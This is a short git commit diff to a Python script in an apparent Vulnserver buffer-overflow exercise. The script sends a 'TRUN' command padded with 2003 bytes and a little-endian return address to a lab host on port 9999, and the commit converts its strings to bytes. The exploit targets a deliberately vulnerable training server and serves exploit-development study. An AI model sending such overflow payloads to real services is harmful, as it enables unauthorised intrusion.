2686addafc9d004794d505b6d8988a0f9f4148f4
deciacco <ec@deciacco.com>
2021-03-26 13:19:51 -0500

    bytearray issue

--- BoF_Vulnserver/05_jumpcode.py
+++ BoF_Vulnserver/05_jumpcode.py
@@ -4,15 +4,15 @@ import sys, socket
 from time import sleep
 
 # 625011af
-shellcode = "A" * 2003 + "\xaf\x11\x50\x62" # x86 architecture, little endian
+shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" # x86 architecture, little endian
 
 try:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(('192.168.1.101',9999))
 
-	payload = "TRUN /.:/" + shellcode
+	payload = b"TRUN /.:/" + shellcode
 
-	s.send((payload.encode()))
+	s.send(payload)
 	s.close()
 except:
 	print ("Error connecting to server")
